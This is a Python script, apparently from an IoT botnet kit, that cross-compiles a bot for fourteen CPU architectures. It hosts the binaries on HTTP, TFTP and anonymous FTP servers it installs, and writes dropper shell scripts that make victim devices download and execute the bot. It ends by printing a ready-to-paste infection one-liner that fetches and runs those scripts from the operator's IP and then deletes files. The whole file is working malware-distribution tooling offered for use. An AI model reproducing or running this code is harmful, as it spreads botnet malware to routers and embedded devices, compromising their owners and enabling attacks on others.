# BusyBox Auto Compiler
# Added new archs !

import subprocess, sys

if len(sys.argv[2]) != 0:
    ip = sys.argv[2]
else:
    print("\x1b[0;31mIncorrect Usage!")
    print("\x1b[0;32mUsage: python " + sys.argv[0] + " <BOTNAME.C> <IPADDR> \x1b[0m")
    exit(1)
    
bot = sys.argv[1]

yourafag = raw_input("Get arch's? Y/n:")
if yourafag.lower() == "y":
    get_arch = True
else:
    get_arch = False

compileas = ["okamiii.m1ps", #mips
             "okamiii.m1psel", #mipsel
             "okamiii.sh4", #sh4
             "okamiii.x86", #x86
             "okamiii.4rm6", #Armv6l
             "okamiii.16", #i686
             "okamiii.ppc", #ppc
             "okamiii.1586", #i586
             "okamiii.m68k", #m68k
             "okamiii.sparc", #sparc
	         "okamiii.4rm4", #armv4l
	         "okamiii.4rm7", #arm7
             "okamiii.ppc440fp", #ppc440fp
	         "okamiii.4rmv5"] #armv5l		 
			 
			 

getarch = ['http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-mips.tar.bz2',
'http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-mipsel.tar.bz2',
'http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-sh4.tar.bz2',
'http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-x86_64.tar.bz2',
'http://distro.ibiblio.org/slitaz/sources/packages/c/cross-compiler-armv6l.tar.bz2',
'http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-i686.tar.bz2',
'http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-powerpc.tar.bz2',
'http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-i586.tar.bz2',
'http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-m68k.tar.bz2',
'http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-sparc.tar.bz2',
'http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-armv4l.tar.bz2',
'https://landley.net/aboriginal/downloads/old/binaries/1.2.6/cross-compiler-armv7l.tar.bz2',
'https://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-powerpc-440fp.tar.bz2',
'http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-armv5l.tar.bz2']

ccs = ["cross-compiler-mips",
       "cross-compiler-mipsel",
       "cross-compiler-sh4",
       "cross-compiler-x86_64",
       "cross-compiler-armv6l",
       "cross-compiler-i686",
       "cross-compiler-powerpc",
       "cross-compiler-i586",
       "cross-compiler-m68k",
       "cross-compiler-sparc",
       "cross-compiler-armv4l",
       "cross-compiler-armv7l",
       "cross-compiler-powerpc-440fp",
       "cross-compiler-armv5l"]
    
def run(cmd):
    subprocess.call(cmd, shell=True)

run("rm -rf /var/www/html/* /var/lib/tftpboot/* /var/ftp/*")

if get_arch == True:
    run("rm -rf cross-compiler-*")

    print("Downloading Architectures")

    for arch in getarch:
        run("wget " + arch + " --no-check-certificate >> /dev/null")
        run("tar -xvf *tar.bz2")
        run("rm -rf *tar.bz2")
        run("tar -xvf *tar.gz")
        run("rm -rf *tar.gz")

    print("Cross Compilers Downloaded...")

num = 0
for cc in ccs:
    arch = cc.split("-")[2]
    run("./"+cc+"/bin/"+arch+"-gcc -static -pthread -D" + arch.upper() + " -o " + compileas[num] + " " + bot + " > /dev/null")
    num += 1

print("Cross Compiling Done!")
print("Setting up your httpd and tftp")

run("yum install httpd -y")
run("service httpd start")
run("yum install xinetd tftp tftp-server -y")
run("yum install vsftpd -y")
run("service vsftpd start")

run('''echo -e "# default: off
# description: The tftp server serves files using the trivial file transfer \
#       protocol.  The tftp protocol is often used to boot diskless \
#       workstations, download configuration files to network-aware printers, \
#       and to start the installation process for some operating systems.
service tftp
{
        socket_type             = dgram
        protocol                = udp
        wait                    = yes
        user                    = root
        server                  = /usr/sbin/in.tftpd
        server_args             = -s -c /var/lib/tftpboot
        disable                 = no
        per_source              = 11
        cps                     = 100 2
        flags                   = IPv4
}
" > /etc/xinetd.d/tftp''')
run("service xinetd start")

run('''echo -e "listen=YES
local_enable=NO
anonymous_enable=YES
write_enable=NO
anon_root=/var/ftp
anon_max_rate=2048000
xferlog_enable=YES
listen_address='''+ ip +'''
listen_port=21" > /etc/vsftpd/vsftpd-anon.conf''')
run("service vsftpd restart")

for i in compileas:
    run("cp " + i + " /var/www/html")
    run("cp " + i + " /var/ftp")
    run("mv " + i + " /var/lib/tftpboot")

run('echo -e "#!/bin/bash" > /var/lib/tftpboot/ab.sh')

run('echo -e "ulimit -n 1024" >> /var/lib/tftpboot/ab.sh')

run('echo -e "cp /bin/busybox /tmp/" >> /var/lib/tftpboot/ab.sh')

run('echo -e "#!/bin/bash" > /var/lib/tftpboot/ac.sh')

run('echo -e "ulimit -n 1024" >> /var/lib/tftpboot/ac.sh')

run('echo -e "cp /bin/busybox /tmp/" >> /var/lib/tftpboot/ac.sh')

run('echo -e "#!/bin/bash" > /var/www/html/brian.sh')

for i in compileas:
    run('echo -e "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; /bin/busybox wget http://' + ip + '/' + i + '; wget http://' + ip + '/' + i + '; chmod +x ' + i + '; ./' + i + '; rm -rf ' + i + '" >> /var/www/html/brian.sh')
    run('echo -e "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; /bin/busybox ftpget -v -u anonymous -p anonymous -P 21 ' + ip + ' ' + i + ' ' + i + '; ftpget -v -u anonymous -p anonymous -P 21 ' + ip + ' ' + i + ' ' + i + '; chmod 777 ' + i + ' ./' + i + '; rm -rf ' + i + '" >> /var/ftp/ftp1.sh')
    run('echo -e "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; /bin/busybox tftp ' + ip + ' -c get ' + i + ';cat ' + i + ' >xxmcnn; tftp ' + ip + ' -c get ' + i + ';cat ' + i + ' >xxmcnn; chmod +x *;./xxmcnn" >> /var/lib/tftpboot/ab.sh')
    run('echo -e "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; /bin/busybox tftp ' + ip + ' -r -g ' + i + '; tftp -r ' + i + ' -g ' + ip + '; cat ' + i + ' >xxmcnn; chmod +x *;./xxmcnn" >> /var/lib/tftpboot/ac.sh')

run("service xinetd restart")
run("service httpd restart")
run('echo -e "ulimit -n 99999" >> ~/.bashrc')
run("cp /var/www/html/brian.sh /var/www/html/infect")

print("\x1b[0;32mYour Payload:\x1b[0m")
print("\x1b[0;32mYour link: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://" + ip + "/brian.sh; chmod 777 brian.sh; sh brian.sh; tftp " + ip + " -c get ab.sh; chmod 777 ab.sh; sh ab.sh; tftp -r ac.sh -g " + ip + "; chmod 777 ac.sh; sh ac.sh; ftpget -v -u anonymous -p anonymous -P 21 " + ip + " ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf brian.sh ab.sh ac.sh ftp1.sh; rm -rf *\x1b[0m")
print("\x1b[0;33Cross Compiling Done\x1b[0m")